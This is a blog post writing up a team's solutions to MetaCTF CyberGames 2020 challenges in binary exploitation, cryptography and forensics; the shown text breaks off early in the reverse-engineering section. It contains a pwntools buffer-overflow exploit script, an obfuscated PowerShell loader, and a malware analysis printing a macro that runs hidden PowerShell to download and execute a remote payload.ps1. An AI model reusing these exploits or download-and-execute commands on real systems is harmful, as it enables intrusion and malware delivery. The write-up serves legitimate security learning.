<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Writeup: MetaCTF CyberGames 2020</title><meta name=description content="I’m currently finishing my final year of Computer Science at the University of Waterloo, with a minor in English Language and Literature. I believe in good writing (docs, code, and words), empathy in tech, and the power of kind mentorship."><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:title" content="Writeup: MetaCTF CyberGames 2020"><meta property="og:description" content="Last weekend MetaCTF hosted their annual CyberGames, lasting 24 hours from Sat Oct 24 12PM EDT to Sun Oct 25 12PM EDT. They had over 1500 teams sign up, with tracks for both students and non-students. My friends and I signed up for the student track as press start to braincell and had a fun (and frustrating) time.
As with other CTFs we&rsquo;ve done, this writeup is by no means conclusive - more of a &ldquo;throw it on the wall and see what sticks&rdquo; - and is written by Dean Jiao, Ruju Jambusaria, and me, of course."><meta property="og:type" content="article"><meta property="og:url" content="https://joyce.fyi/posts/metactf-cybergames-2020/"><meta property="article:published_time" content="2020-10-26T08:54:17-04:00"><meta property="article:modified_time" content="2020-10-26T08:54:17-04:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup: MetaCTF CyberGames 2020"><meta name=twitter:description content="Last weekend MetaCTF hosted their annual CyberGames, lasting 24 hours from Sat Oct 24 12PM EDT to Sun Oct 25 12PM EDT. They had over 1500 teams sign up, with tracks for both students and non-students. My friends and I signed up for the student track as press start to braincell and had a fun (and frustrating) time.
As with other CTFs we&rsquo;ve done, this writeup is by no means conclusive - more of a &ldquo;throw it on the wall and see what sticks&rdquo; - and is written by Dean Jiao, Ruju Jambusaria, and me, of course."><link rel=stylesheet href=https://joyce.fyi/css/style-light.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://joyce.fyi/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a><a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a><a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast');" style=display:none><i class="fas fa-chevron-up fa-lg"></i></a><span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/experience>Experience</a></li><li><a href=/posts>Posts</a></li><li><a href=/writings>Publications</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://joyce.fyi/posts/bo1lers-bootcamp-2020/><i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li><li><a class=icon href=https://joyce.fyi/posts/learning-to-read/><i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li><li><a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li><li><a class=icon href=#><i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f"><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&text=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&is_video=false&description=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Writeup%3a%20MetaCTF%20CyberGames%202020&body=Check out this article: https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f"><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-stumbleupon" aria-hidden=true></i></a></li><li><a class=icon href="http://digg.com/submit?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-digg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&name=Writeup%3a%20MetaCTF%20CyberGames%202020&description=Last%20weekend%20MetaCTF%20hosted%20their%20annual%20CyberGames%2c%20lasting%2024%20hours%20from%20Sat%20Oct%2024%2012PM%20EDT%20to%20Sun%20Oct%2025%2012PM%20EDT.%20They%20had%20over%201500%20teams%20sign%20up%2c%20with%20tracks%20for%20both%20students%20and%20non-students.%20My%20friends%20and%20I%20signed%20up%20for%20the%20student%20track%20as%20press%20start%20to%20braincell%20and%20had%20a%20fun%20%28and%20frustrating%29%20time.%0aAs%20with%20other%20CTFs%20we%26rsquo%3bve%20done%2c%20this%20writeup%20is%20by%20no%20means%20conclusive%20-%20more%20of%20a%20%26ldquo%3bthrow%20it%20on%20the%20wall%20and%20see%20what%20sticks%26rdquo%3b%20-%20and%20is%20written%20by%20Dean%20Jiao%2c%20Ruju%20Jambusaria%2c%20and%20me%2c%20of%20course."><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&t=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#binary-exploitation>Binary Exploitation</a><ul><li><a href=#baffling-buffer-0>Baffling Buffer 0</a></li><li><a href=#baffling-buffer-1>Baffling Buffer 1</a></li></ul></li><li><a href=#cryptography>Cryptography</a><ul><li><a href=#crypto-stands-for-cryptography>Crypto Stands for Cryptography</a></li><li><a href=#rot-26>ROT 26</a></li><li><a href=#welcome-to-the-obfuscation-games>Welcome to the Obfuscation Games!</a></li><li><a href=#the-last-great-zip-file>The Last Great Zip File</a></li></ul></li><li><a href=#forensics>Forensics</a><ul><li><a href=#forensics-101>Forensics 101</a></li><li><a href=#staging-in-123>Staging in 1..2..3</a></li><li><a href=#publish3r>Publish3r</a></li><li><a href=#open-thermal-exhaust>Open Thermal Exhaust</a></li></ul></li><li><a href=#reverse-engineering>Reverse Engineering</a><ul><li><a href=#redacted>[REDACTED]</a></li><li><a href=#password-here-please-unfinished>Password Here Please [unfinished]</a></li></ul></li><li><a href=#reconnaissance>Reconnaissance</a><ul><li><a href=#big-breaches>Big Breaches</a></li><li><a href=#not-so-itsy-bitsy-spider>Not So Itsy Bitsy Spider</a></li><li><a href=#diving-into-the-announcement>Diving into the Announcement</a></li><li><a href=#finding-mr-casyn>Finding Mr Casyn</a></li><li><a href=#ring-ring>Ring Ring</a></li><li><a href=#hangout-spots>Hangout Spots</a></li></ul></li><li><a href=#web-exploitation>Web Exploitation</a><ul><li><a href=#high-security-fan-page>High Security Fan Page</a></li><li><a href=#barrys-web-application>Barry&rsquo;s Web Application</a></li><li><a href=#everyone-loves-a-good-cookie>Everyone Loves a Good Cookie</a></li></ul></li><li><a href=#other>Other</a><ul><li><a href=#watermarked>Watermarked</a></li><li><a href=#checkmate-in-1-unfinished>Checkmate in 1 [unfinished]</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">Writeup: MetaCTF CyberGames 2020</h1><div class=meta><div class=postdate><time datetime="2020-10-26 08:54:17 -0400 -0400" itemprop=datePublished>2020-10-26</time></div><div class=article-category><i class="fas fa-archive"></i>&nbsp;<a class=category-link href=/categories/writeup>writeup</a></div><div class=article-tag><i class="fas fa-tag"></i>&nbsp;<a class=tag-link href=/tags/ctf rel=tag>ctf</a>
&nbsp;<a class=tag-link href=/tags/security rel=tag>security</a></div></div></header><div class=content itemprop=articleBody><p>Last weekend MetaCTF hosted their annual CyberGames, lasting 24 hours from Sat Oct 24 12PM EDT to Sun Oct 25 12PM EDT. They had over 1500 teams sign up, with tracks for both students and non-students. My friends and I signed up for the student track as <code>press start to braincell</code> and had a fun (and frustrating) time.</p><p>As with other CTFs we&rsquo;ve done, this writeup is by <em>no</em> means conclusive - more of a &ldquo;throw it on the wall and see what sticks&rdquo; - and is written by <a href=https://twitter.com/deanjiao>Dean Jiao</a>, <a href=http://github.com/rujuj>Ruju Jambusaria</a>, and me, of course.</p><p>There were seven categories overall:</p><ul><li><a href=#binary-exploitation>Binary Exploitation</a></li><li><a href=#cryptography>Cryptography</a></li><li><a href=#forensics>Forensics</a></li><li><a href=#reverse-engineering>Reverse Engineering</a></li><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#web-exploitation>Web Exploitation</a></li><li><a href=#other>Other</a></li></ul><h1 id=binary-exploitation>Binary Exploitation</h1><h2 id=baffling-buffer-0>Baffling Buffer 0</h2><blockquote><p>While hunting for vulnerabilities in client infrastructure, you discover a strange service located at <code>host1.metaproblems.com 5150</code>. You&rsquo;ve uncovered the binary and source code of the remote service, which looks somewhat unfinished. The code is written in a very exploitable manner. Can you find out how to make the program give you the flag?</p></blockquote><p>Looking at the source code, we can see that the main function is this <code>vuln()</code>: it has a buffer for 48 characters, but it doesn&rsquo;t actually check the contents and their length:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>() {
	<span style=color:#8be9fd>int</span> isAuthenticated <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
	<span style=color:#8be9fd>char</span> buf[<span style=color:#bd93f9>48</span>];
	puts(<span style=color:#f1fa8c>&#34;Enter the access code: &#34;</span>);
	gets(buf);
	puts(<span style=color:#f1fa8c>&#34;TODO: Implement access code checking.&#34;</span>);
	<span style=color:#ff79c6>if</span>(isAuthenticated) {
		system(<span style=color:#f1fa8c>&#34;/bin/cat flag.txt&#34;</span>);
	}
	<span style=color:#ff79c6>else</span> {
		puts(<span style=color:#f1fa8c>&#34;Invalid auth!&#34;</span>);
	}
}
</code></pre></div><p>Notice how the access code isn&rsquo;t checked at all, and <code>isAuthenticated</code> is never modified. We want <code>isAuthenticated</code> to be any value <em>other</em> than 0, so that it will register as <code>true</code>.</p><p>So, we can modify <code>isAuthenticated</code> by overflowing the buffer (by entering > 48 characters<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>), which will then print out the flag and cause a segmentation fault.</p><p><strong>Flag</strong>: <code>MetaCTF{just_a_little_auth_bypass}</code></p><h2 id=baffling-buffer-1>Baffling Buffer 1</h2><blockquote><p>After pointing out the initial issue, the developers issued a new update on the login service and restarted it at host1.metaproblems.com 5151. Looking at the binary and source code, you discovered that this code is still vulnerable.</p></blockquote><p>Looking at the source code we have:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>win</span>() {
	system(<span style=color:#f1fa8c>&#34;/bin/cat flag.txt&#34;</span>);
	exit(<span style=color:#bd93f9>0</span>);
}

<span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>() {
	<span style=color:#8be9fd>char</span> buf[<span style=color:#bd93f9>48</span>];
	puts(<span style=color:#f1fa8c>&#34;Enter the access code: &#34;</span>);
	gets(buf);

	<span style=color:#ff79c6>if</span>(strcmp(buf, <span style=color:#f1fa8c>&#34;Sup3rs3cr3tC0de&#34;</span>) <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span>) {
		puts(<span style=color:#f1fa8c>&#34;Access granted!&#34;</span>);
	}
	<span style=color:#ff79c6>else</span> {
		puts(<span style=color:#f1fa8c>&#34;Invalid auth.&#34;</span>);
		exit(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>);
	}
}
</code></pre></div><p>We want to get to the <code>win()</code> function, so we want to overflow the <code>buf</code> array again. However, just entering long garbage won&rsquo;t work - <code>strcmp</code> will compare it to the <code>Sup3rs3cr3tC0d3</code> and then exit immediately.</p><p><code>strcmp</code> compares strings until the <code>\0</code> character - the null terminator in C-strings. We can take advantage of this by <em>beginning</em> our string with the <code>Sup3rs3cr3tC0d3</code>, adding a null terminator, and then flooding the rest of the buffer with garbage.<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></p><p>Here&rsquo;s how I did that using <code>pwntools</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>

elf <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#34;./bb1&#34;</span>)

p <span style=color:#ff79c6>=</span> remote(<span style=color:#f1fa8c>&#34;host1.metaproblems.com&#34;</span>, <span style=color:#bd93f9>5151</span>)
<span style=color:#6272a4># p = process(&#34;./bb1&#34;)</span>
payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#34;Sup3rs3cr3tC0de</span><span style=color:#f1fa8c>\0</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#34;A&#34;</span><span style=color:#ff79c6>*</span><span style=color:#bd93f9>40</span> <span style=color:#ff79c6>+</span> p64(elf<span style=color:#ff79c6>.</span>sym[<span style=color:#f1fa8c>&#34;win&#34;</span>])

p<span style=color:#ff79c6>.</span>recv()
p<span style=color:#ff79c6>.</span>sendline(payload)

p<span style=color:#ff79c6>.</span>interactive()
</code></pre></div><p>Running this Python script will then print out the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{c_strings_are_the_best_strings}</code><br><strong>Tools</strong>: <a href=https://github.com/Gallopsled/pwntools><code>pwntools</code></a></p><h1 id=cryptography>Cryptography</h1><h2 id=crypto-stands-for-cryptography>Crypto Stands for Cryptography</h2><blockquote><p>The data security team said they currently use something called Base64 to &ldquo;encrypt&rdquo; data. They want to know if that&rsquo;s a secure way to store sensitive data, and provided a sample of data. Is it secure? Can you crack it?</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#8be9fd;font-style:italic>TWV0YUNURntiYXNlNjRfZW5jMGRpbmdfaXNfbjB0X3RoZV9zYW1lX2FzX2VuY3J5cHRpMG4hfQ</span><span style=color:#ff79c6>==</span>
</code></pre></div><p>The <code>==</code> is a telltale sign of <code>base64</code> so that&rsquo;s exactly what Ruju tried to decode.</p><p>Entering given text in a <a href=https://www.base64decode.org/>Base64 decoder</a> and hitting decode will then give us the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{base64_enc0ding_is_n0t_the_same_as_encrypti0n!}</code><br><strong>Tools</strong>: <a href=https://www.base64decode.org/>Base64 decoder</a></p><h2 id=rot-26>ROT 26</h2><blockquote><p>We&rsquo;ve applied some encoding to obfuscate our messages. There&rsquo;s no way you can figure out the original message now?! I applied the unbreakable ROT 26 algorithm:</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>g!0<span style=color:#ff79c6>{]</span>n<span style=color:#f1fa8c>`</span>7*+0y~+1|<span style=color:#ff79c6>(</span>!y.+0yKM9
</code></pre></div><p>To solve this, Dean wrote a great Python script that rotates each character by 26, using their ASCII values. Since there&rsquo;s a chance that the ASCII values fall below 33 (where the characters like &ldquo;Space&rdquo;, &ldquo;ESC&rdquo;, etc. begin), the script will move it to the &lsquo;end&rsquo; of the ASCII table by adding 94.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>a<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;&#39;</span>
<span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>input</span>:
    num <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(i) <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>26</span>
    <span style=color:#ff79c6>if</span> num <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>33</span>: 
        num <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>94</span>
    a <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(num)
</code></pre></div><p><strong>Flag</strong>: <code>MetaCTF{not_double_rot_13}</code><br><strong>Fun fact</strong>: This can actually also be solved using <a href=https://www.dcode.fr/rot-cipher>dcode</a>, with the <code>ASCII[!-~]+26</code> variant.</p><h2 id=welcome-to-the-obfuscation-games>Welcome to the Obfuscation Games!</h2><blockquote><p>During a recent incident response investigation, we came across this suspicious command executed by an attacker, and we&rsquo;d like you to analyze it. Malware authors like to obfuscate their payloads to make it harder, but we&rsquo;re sure you&rsquo;re up to the task. See if you can figure out what&rsquo;s happening without even running it!</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#8be9fd;font-style:italic>$s</span>=<span style=color:#8be9fd;font-style:italic>New-Object</span> IO.MemoryStream(,[Convert]::FromBase64String(<span style=color:#f1fa8c>&#34;H4sIAEFgjl8A/xXMMQrCQBCF4as8FltPIFaCnV3A8jFmn8ngupuYaUS8e5LyL77//vHQcWxLIHWj8Cw2wBd4RWyp2resjMm+pVlOJxzmGWekm8Iu3fU3ScXrwIf1L26C+4CtijukBY3hb/3TCj2Ieh9qAAAA&#34;</span>));<span style=color:#8be9fd;font-style:italic>IEX </span>(<span style=color:#8be9fd;font-style:italic>New-Object</span> IO.StreamReader(<span style=color:#8be9fd;font-style:italic>New-Object</span> IO.Compression.GzipStream(<span style=color:#8be9fd;font-style:italic>$s</span>,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
</code></pre></div><p>The two key things I notice there are:</p><ul><li><code>[Convert]::FromBase64String</code>, and</li><li><code>Compression.GzipStream</code></li></ul><p>So, if we use <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Gunzip()">Cyberchef</a> and use the recipes &ldquo;From Base64&rdquo;, followed by &ldquo;Gunzip&rdquo; (to <em>de</em>compress the <code>gzip</code> compression), we can get the decoded content and flag:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#8be9fd;font-style:italic>Write-host</span> <span style=color:#f1fa8c>&#34;The flag is in the encoded payload&#34;</span>; <span style=color:#8be9fd;font-style:italic>$qq</span> = <span style=color:#f1fa8c>&#34;MetaCTF{peeling_back_the_flag_one_code_at_a_time}&#34;</span>
</code></pre></div><p><strong>Flag</strong>: <code>MetaCTF{peeling_back_the_flag_one_code_at_a_time}</code><br><strong>Tools</strong>: <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Gunzip()">Cyberchef</a></p><h2 id=the-last-great-zip-file>The Last Great Zip File</h2><blockquote><p>Help! I&rsquo;ve created a zip archive that contains my favorite flag, but I forgot the password to it. Can you help me recover my flag back?</p></blockquote><p>I originally wanted to try using <code>john</code> for this challenge, but I had some trouble using the <code>zip2john</code> tool to get the password hash from the zipfile.</p><p>Instead, I found an online tool for <a href=https://passwordrecovery.io/zip-file-password-removal/>zip file password removal</a>.<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup> Running the zip file through this tool gave the password <code>Soldat*13</code>, which then gave us this picture of a flag:
<img src=/img/metactf-2020/planet.png alt="Black, handwritten text on a white background. Looks a little bit like it was written while the user was using a mouse. Text has the flag."></p><p><strong>Flag</strong>: <code>MetaCTF{crack_the_planet}</code><br><strong>Tools</strong>: <a href=https://passwordrecovery.io/zip-file-password-removal/>zip file password removal</a></p><h1 id=forensics>Forensics</h1><h2 id=forensics-101>Forensics 101</h2><blockquote><p>Sometimes in forensics, we run into files that have odd or unknown file extensions. In these cases, it&rsquo;s helpful to look at some of the file format signatures to figure out what they are. We use something called &ldquo;magic bytes&rdquo; which are the first few bytes of a file.<br>What is the ASCII representation of the magic bytes for a RAR archive?</p></blockquote><p>Ruju googled <code>ASCII representation of the magic bytes for a RAR archive</code> and clicked the first <a href=https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/>link about magic bytes</a>. This page shows the magic bytes for a lot of file types. Looking under RAR gave the RAR file&rsquo;s magic bytes.</p><p><strong>Flag</strong>: <code>"Rar!...."</code><br><strong>Further reading</strong>: <a href=https://en.wikipedia.org/wiki/List_of_file_signatures>List of magic bytes</a></p><h2 id=staging-in-123>Staging in 1..2..3</h2><blockquote><p>The Incident Response (IR) team identified evidence that a Threat Actor accessed a system that contains sensitive company information. The Chief Information Security Officer (CISO) wants to know if any data was accessed or taken. There was a suspicious file created during the timeframe of Threat Actor activity: <code>C:\123.tmp</code>. Can you check it out?</p></blockquote><p>Running <code>file</code> against this &lsquo;tmp&rsquo; file shows that it&rsquo;s actually a RAR file. Either unzipping it or browsing it (in, say, WinRAR) will give a folder name with the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{definitely_n0t_all_0f_y0ur_sensitive_data}</code><br><strong>Tools</strong>: <a href=https://linux.die.net/man/1/file><code>file</code></a></p><h2 id=publish3r>Publish3r</h2><blockquote><p>We believe we found a malicious file on someone&rsquo;s workstation. Judging by looking at it, the file likely came from a phishing email. Anyways, we&rsquo;d like you to analyze the sample, so we can see what would have happened if it executed successfully. That way we can hunt for signs of it across the enterprise. Your flag will be the URL that the malware is trying to reach out to! Can you do it? Format: <code>MetaCTF{http://.........}</code></p></blockquote><p>Once we unzipped the file, we found out from Windows Defender that the virus was called <code>Trojan:O97M/Sadoca.C!ml</code> and it was contained within a Publisher file called <code>Publish3r.pub</code>.</p><p>Since this was an Office file, we tried finding a tool to analyse Office macros, and we found <a href=https://blog.didierstevens.com/programs/oledump-py/><code>oledump</code></a>. Running the file against <code>oledump</code> gave us:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>&gt; py oledump_V0_0_54/oledump.py Publish3r/Publish3r.pub
  <span style=color:#ff79c6>[</span>...<span style=color:#ff79c6>]</span>
  10:     <span style=color:#bd93f9>21504</span> <span style=color:#f1fa8c>&#39;Quill/QuillSub/CONTENTS&#39;</span>
  11:       <span style=color:#bd93f9>420</span> <span style=color:#f1fa8c>&#39;VBA/PROJECT&#39;</span>
  12:        <span style=color:#bd93f9>65</span> <span style=color:#f1fa8c>&#39;VBA/PROJECTwm&#39;</span>
  13: m     <span style=color:#bd93f9>771</span> <span style=color:#f1fa8c>&#39;VBA/VBA/Module1&#39;</span>
  14: M    <span style=color:#bd93f9>3043</span> <span style=color:#f1fa8c>&#39;VBA/VBA/ThisDocument&#39;</span>
  <span style=color:#ff79c6>[</span>...<span style=color:#ff79c6>]</span>
</code></pre></div><p>According to that post about <code>oledump</code>, the <code>M</code> on line 14 indicates that a VBA macro was detected. If we run <code>oledump</code> with the option <code>-sf 14</code>, we can dig into the 14th file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>&gt; py oledump_V0_0_54/oledump.py Publish3r/Publish3r.pub
...
Dim RetVal
<span style=color:#8be9fd;font-style:italic>RetVal</span> <span style=color:#ff79c6>=</span> Shell<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec Bypass -windowstyle hidden -enc SQBFAHgAIAAoACgAbgBFAFcALQBPAEIASgBlAEMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACgAIgBoAHQAdABwADoALwAvADEAMwAuADMANwAuADEAMAAuADEAMAA6ADQANAA0ADMALwBkAG8AYwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkAKQApAA==&#34;</span>, 1<span style=color:#ff79c6>)</span>
</code></pre></div><p>Taking the long string after <code>-enc</code>, it looks like a Base64 string again with the characteristic <code>==</code>. Running it through a <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)">Base64 decoder</a>, we get:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>I.E.x. .<span style=color:#ff79c6>(</span>.<span style=color:#ff79c6>(</span>.n.E.W.-.O.B.J.e.C.t. .n.e.t...w.e.b.c.l.i.e.n.t.<span style=color:#ff79c6>)</span>...d.o.w.n.l.o.a.d.s.t.r.i.n.g.<span style=color:#ff79c6>(</span>.<span style=color:#ff79c6>(</span>.<span style=color:#f1fa8c>&#34;.h.t.t.p.:././.1.3...3.7...1.0...1.0.:.4.4.4.3./.d.o.c./.p.a.y.l.o.a.d...p.s.1.&#34;</span>.<span style=color:#ff79c6>)</span>.<span style=color:#ff79c6>)</span>.<span style=color:#ff79c6>)</span>.
</code></pre></div><p>Once we remove the periods, we&rsquo;ll have the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{http://13.37.10.10:4443/doc/payload.ps1}</code><br><strong>Tools</strong>: <a href=https://blog.didierstevens.com/programs/oledump-py/><code>oledump</code></a>, <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)">Cyberchef</a></p><h2 id=open-thermal-exhaust>Open Thermal Exhaust</h2><blockquote><p>Our TCP connect Nmap scan found some open ports it seems. We may only have a pcap of the traffic, but I&rsquo;m sure that won&rsquo;t be a problem! Can you tell us which ones they are? The flag will be the sum of the open ports. For example, if ports 25 and 110 were open, the answer would be MetaCTF{135}.</p></blockquote><p>Opening the pcap file in Wireshark, if we apply the filter <code>(tcp.flags.ack == 1) && (tcp.flags.syn == 1)</code>, the results will be ports where the server actually responded to the connection request - meaning that they&rsquo;re open.</p><p>Summing the port numbers together, we get:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#bd93f9>80</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>443</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>23</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>21</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>53</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>22</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>3128</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>3770</span>
</code></pre></div><p><strong>Flag</strong>: <code>MetaCTF{3770}</code><br><strong>Tools</strong>: <a href=https://www.wireshark.org/>Wireshark</a><br><strong>Further reading</strong>: <a href=https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment>TCP 3-way handshake</a></p><h1 id=reverse-engineering>Reverse Engineering</h1><h2 id=redacted>[REDACTED]</h2><blockquote><p>The CEO of Cyber Corp has strangely disappeared over the weekend. After looking more into his disappearance Local Police Department thinks he might have gotten caught up into some illicit activities.
